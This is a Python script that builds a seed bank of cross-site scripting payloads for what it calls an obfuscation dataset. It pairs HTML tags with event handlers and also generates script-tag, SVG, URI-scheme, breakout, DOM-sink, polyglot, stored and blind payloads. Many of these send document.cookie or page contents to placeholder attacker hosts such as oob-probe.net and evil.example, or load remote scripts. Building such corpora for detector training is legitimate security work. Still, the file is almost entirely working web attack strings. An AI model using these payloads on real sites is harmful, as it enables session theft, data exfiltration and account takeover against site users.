#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site scripting seed bank for the v2 obfuscation dataset.

Dataset v1 had 25 XSS seeds. The single biggest source of genuine variety in
XSS is the tag x event-handler matrix -- `<img onerror>` and `<details ontoggle>`
share no substring beyond the angle brackets, so they count as different
families even before any obfuscation is applied.

Only handlers that actually fire on a given tag are paired with it. A seed that
could never execute is noise, not a hard example.

Every seed is a dict:

    {"payload": str, "category": str}

`build_xss_seeds()` is deterministic.
"""
from __future__ import annotations

import random

# ---------------------------------------------------------------------------
# sinks: what the payload does once it runs
# ---------------------------------------------------------------------------
SINKS = [
    "alert(1)", "alert(document.domain)", "alert(document.cookie)",
    "alert('XSS')", "confirm(1)", "prompt(1)", "print()",
    "fetch('//x.oob-probe.net/?c='+document.cookie)",
    "new Image().src='//x.oob-probe.net/?d='+document.cookie",
    "eval(atob('YWxlcnQoMSk='))",
    "document.location='//x.oob-probe.net/?'+document.cookie",
    "navigator.sendBeacon('//x.oob-probe.net',document.cookie)",
    "window.top.location='//evil.example/'",
    "fetch('/api/v1/users').then(r=>r.text()).then(t=>fetch('//x.oob-probe.net/?t='+t))",
    "this.parentNode.innerHTML='<b>owned</b>'",
    "document.body.appendChild(document.createElement('script')).src='//x.oob-probe.net/p.js'",
]

# tag -> handlers that genuinely fire for that element
TAG_EVENTS = {
    "img": ["onerror", "onload"],
    "svg": ["onload"],
    "body": ["onload", "onpageshow", "onhashchange", "onresize", "onunload"],
    "input": ["onfocus", "oninput", "onchange", "oninvalid"],
    "details": ["ontoggle", "onbeforetoggle"],
    "marquee": ["onstart", "onfinish", "onbounce"],
    "video": ["onerror", "onplay", "onloadstart", "oncanplay"],
    "audio": ["onerror", "onplay", "onloadstart"],
    "iframe": ["onload", "onerror"],
    "object": ["onerror"],
    "embed": ["onerror"],
    "select": ["onfocus", "onchange"],
    "textarea": ["onfocus", "oninput"],
    "form": ["onsubmit"],
    "div": ["onmouseover", "onclick", "onwheel", "onpointerover", "onanimationstart"],
    "a": ["onmouseover", "onclick", "onfocus"],
    "button": ["onclick", "onfocus", "onmouseover"],
    "table": ["onmouseover"],
    "td": ["onmouseover"],
    "style": ["onload"],
    "script": ["onerror"],
    "canvas": ["onmouseover"],
    "keygen": ["onfocus"],
    "isindex": ["onfocus"],
    "math": ["onshow"],
    "menu": ["onshow"],
    "track": ["onerror"],
    "source": ["onerror"],
    "picture": ["onerror"],
}

# attributes that make a tag focusable / renderable so the handler can fire
TAG_FILLER = {
    "img": ["src=x", "src=1", "src=//invalid", "srcset=x"],
    "svg": ["", "/", " width=1 height=1"],
    "input": ["autofocus", "autofocus type=text", "type=text autofocus"],
    "details": ["open"],
    "video": ["><source src=x", " src=x", " autoplay"],
    "audio": [" src=x", " autoplay"],
    "iframe": ["src=x", "src=//invalid"],
    "object": ["data=x"],
    "embed": ["src=x"],
    "select": ["autofocus"],
    "textarea": ["autofocus"],
    "div": ["style=width:100px;height:100px", ""],
    "a": ["href=#", "href=x"],
    "button": ["autofocus", ""],
    "keygen": ["autofocus"],
    "isindex": ["autofocus"],
    "track": ["src=x"],
    "source": ["src=x"],
    "picture": ["><source srcset=x"],
    "canvas": [""],
    "style": [""],
    "body": [""],
    "marquee": [""],
    "form": [""],
    "table": [""],
    "td": [""],
    "script": ["src=x"],
    "math": [""],
    "menu": [""],
}


def _event_handler(rng: random.Random) -> list[dict]:
    out = []
    for tag, events in TAG_EVENTS.items():
        fillers = TAG_FILLER.get(tag, [""])
        for event in events:
            for _ in range(2):
                filler = rng.choice(fillers)
                sink = rng.choice(SINKS)
                quote = rng.choice(["", "", "\"", "'"])
                attr = f"{event}={quote}{sink}{quote}"
                middle = f" {filler}" if filler and not filler.startswith(">") else filler
                if filler.startswith(">"):
                    payload = f"<{tag}{filler} {attr}>"
                else:
                    payload = f"<{tag}{middle} {attr}>".replace("  ", " ")
                out.append({"payload": payload, "category": "event_handler"})
    return out


def _script_tag(rng: random.Random) -> list[dict]:
    out = []
    for sink in SINKS:
        out.append({"payload": f"<script>{sink}</script>", "category": "script_tag"})
    hosts = ["//x.oob-probe.net/p.js", "//cdn.evil.example/x.js", "/\\/\\evil.example/j",
             "data:text/javascript,alert(1)"]
    for host in hosts:
        for form in [f"<script src={host}></script>",
                     f"<script src=\"{host}\"></script>",
                     f"<script/src={host}></script>",
                     f"<script\tsrc={host}></script>"]:
            out.append({"payload": form, "category": "script_tag"})
    for extra in [
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>[].constructor.constructor('alert(1)')()</script>",
        "<script>self['ale'+'rt'](1)</script>",
        "<script>window['al'+'ert'](document.domain)</script>",
        "<script>top[Object.keys(top).find(k=>k=='alert')](1)</script>",
        "<script>({}).constructor.constructor('alert(1)')()</script>",
    ]:
        out.append({"payload": extra, "category": "script_tag"})
    return out


def _svg_namespace(rng: random.Random) -> list[dict]:
    out = []
    shapes = [
        "<svg onload={s}>",
        "<svg/onload={s}>",
        "<svg><script>{s}</script></svg>",
        "<svg><animate onbegin={s} attributeName=x dur=1s>",
        "<svg><set onbegin={s} attributeName=x>",
        "<svg><animatetransform onbegin={s} attributeName=transform>",
        "<svg><foreignObject><iframe onload={s}></foreignObject></svg>",
        "<svg><a xlink:href=javascript:{s}><text x=20 y=20>click</text></a></svg>",
        "<svg><discard onbegin={s}>",
        "<svg><image href=x onerror={s}>",
        "<svg xmlns='http://www.w3.org/2000/svg' onload={s}>",
    ]
    for shape in shapes:
        for sink in rng.sample(SINKS, k=5):
            out.append({"payload": shape.format(s=sink), "category": "svg_namespace"})
    return out


def _uri_scheme(rng: random.Random) -> list[dict]:
    out = []
    schemes = [
        "javascript:{s}",
        "javascript:void({s})",
        "JaVaScRiPt:{s}",
        "java\tscript:{s}",
        "vbscript:msgbox(1)",
        "data:text/html,<script>{s}</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]
    carriers = [
        "<a href=\"{u}\">click</a>",
        "<iframe src=\"{u}\">",
        "<object data=\"{u}\">",
        "<embed src=\"{u}\">",
        "<form action=\"{u}\"><input type=submit>",
        "<a href='{u}'>x</a>",
        "{u}",
    ]
    for scheme in schemes:
        for carrier in carriers:
            sink = rng.choice(SINKS[:6])
            out.append({"payload": carrier.format(u=scheme.format(s=sink)),
                        "category": "uri_scheme"})
    return out


def _tag_breakout(rng: random.Random) -> list[dict]:
    """Escaping out of an attribute or text node the app already put us in."""
    out = []
    prefixes = [
        "\">", "'>", "\"><", "'-", "\"-", "</textarea>", "</title>", "</style>",
        "</script>", "</noscript>", "']", "\"} ", "*/", "-->", "]]>",
    ]
    bodies = [
        "<script>{s}</script>", "<img src=x onerror={s}>", "<svg onload={s}>",
        "<body onload={s}>", "<iframe onload={s}>", "<details open ontoggle={s}>",
    ]
    for prefix in prefixes:
        for body in rng.sample(bodies, k=3):
            sink = rng.choice(SINKS[:8])
            out.append({"payload": prefix + body.format(s=sink),
                        "category": "tag_breakout"})
    # attribute-context breakouts that never open a new tag
    for form in [
        "' onmouseover='alert(1)", "\" onmouseover=\"alert(1)",
        "' autofocus onfocus='alert(1)", "\" autofocus onfocus=\"alert(1)",
        "'-alert(1)-'", "\"-alert(1)-\"", "';alert(1);//", "\";alert(1);//",
        "`-alert(1)-`", "${alert(1)}", "'+alert(1)+'", "\\'-alert(1)//",
    ]:
        out.append({"payload": form, "category": "tag_breakout"})
    return out


def _dom_sink(rng: random.Random) -> list[dict]:
    out = []
    shapes = [
        "#<img src=x onerror={s}>",
        "#\"><script>{s}</script>",
        "?name=<script>{s}</script>",
        "javascript:document.body.innerHTML='<img src=x onerror={s}>'",
        "<script>document.write(location.hash.slice(1))</script>",
        "<script>document.body.innerHTML=location.search</script>",
        "<script>eval(location.hash.slice(1))</script>",
        "<script>document.getElementById('out').innerHTML=decodeURIComponent(location.search)</script>",
        "<script>new Function(location.hash.slice(1))()</script>",
        "<script>setTimeout(location.hash.slice(1))</script>",
        "<script>location=document.referrer</script>",
        "<script>document.write(unescape(location.search))</script>",
    ]
    for shape in shapes:
        for sink in rng.sample(SINKS[:8], k=3):
            out.append({"payload": shape.format(s=sink), "category": "dom_sink"})
    return out


def _polyglot(rng: random.Random) -> list[dict]:
    payloads = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"
        "%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/"
        "<sVg/oNloAd=alert()//>\\x3e",
        "\">'><img src=x onerror=alert(1)>",
        "'\"--></style></script><script>alert(1)</script>",
        "</title></style></textarea></script><script>alert(1)</script>",
        "\"><svg/onload=alert(1)>//",
        "'\"><img src=x onerror=alert(document.domain)>",
        "-->'\"/></sCript><svG x=\">\" onload=(co\u006efirm)``>",
        "\";alert(1);//<script>alert(1)</script>",
        "</script><svg onload=alert(1)>",
        "'></textarea><script>alert(1)</script>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<style>@import'javascript:alert(1)';</style>",
        "<form><button formaction=javascript:alert(1)>x</button>",
        "<isindex action=javascript:alert(1) type=submit value=click>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<template><img src=x onerror=alert(1)></template>",
    ]
    return [{"payload": p, "category": "polyglot"} for p in payloads]


def _stored(rng: random.Random) -> list[dict]:
    """Payloads shaped like ordinary user content so they survive a write step."""
    out = []
    wrappers = [
        "Great product! <img src=x onerror={s}>",
        "Thanks <script>{s}</script>",
        "5 stars <svg onload={s}>",
        "Rất tốt <img src=x onerror={s}>",
        "see my profile <a href=javascript:{s}>here</a>",
        "<b>bold review</b><img src=x onerror={s}>",
        "nice!<details open ontoggle={s}>",
        "reply: \"><script>{s}</script>",
    ]
    for wrapper in wrappers:
        for sink in rng.sample(SINKS[:10], k=4):
            out.append({"payload": wrapper.format(s=sink), "category": "stored"})
    return out


def _blind(rng: random.Random) -> list[dict]:
    """Out-of-band callbacks; the id is randomised per row later, not per seed."""
    out = []
    shapes = [
        "<script src=//{h}/x></script>",
        "<img src=x onerror=this.src='//{h}/c='+document.cookie>",
        "\"><script src=//{h}></script>",
        "<script>new Image().src='//{h}/?d='+document.cookie</script>",
        "<svg onload=fetch('//{h}/?c='+document.cookie)>",
        "<iframe src=//{h}/f onload=this.contentWindow.name=document.cookie>",
        "<script>navigator.sendBeacon('//{h}',document.cookie)</script>",
        "<body onload=document.location='//{h}/?'+document.cookie>",
        "<script>fetch('//{h}',{{method:'POST',body:document.body.innerHTML}})</script>",
        "<link rel=dns-prefetch href=//{h}>",
    ]
    hosts = ["oob-{id}.collab-listener.net", "{id}.oob-callback.net",
             "hook-{id}.probe-server.io", "{id}.dnslog-probe.net"]
    for shape in shapes:
        for host in hosts:
            out.append({"payload": shape.format(h=host), "category": "blind"})
    return out


# ---------------------------------------------------------------------------
def build_xss_seeds(seed: int = 1337) -> list[dict]:
    """Deterministic seed bank. Duplicates by payload text are removed."""
    rng = random.Random(seed)
    seeds: list[dict] = []
    for builder in (_event_handler, _script_tag, _svg_namespace, _uri_scheme,
                    _tag_breakout, _dom_sink, _polyglot, _stored, _blind):
        seeds.extend(builder(rng))

    unique: dict[str, dict] = {}
    for item in seeds:
        unique.setdefault(item["payload"], item)
    result = sorted(unique.values(), key=lambda d: (d["category"], d["payload"]))
    for index, item in enumerate(result):
        item["seed_id"] = f"xss_{item['category']}_{index:04d}"
        item["dbms"] = "n/a"
    return result


if __name__ == "__main__":
    from collections import Counter

    bank = build_xss_seeds()
    print(f"total XSS seeds: {len(bank)}")
    print("by category:", dict(Counter(s["category"] for s in bank)))
    for sample in bank[:5]:
        print("  ", sample["payload"])
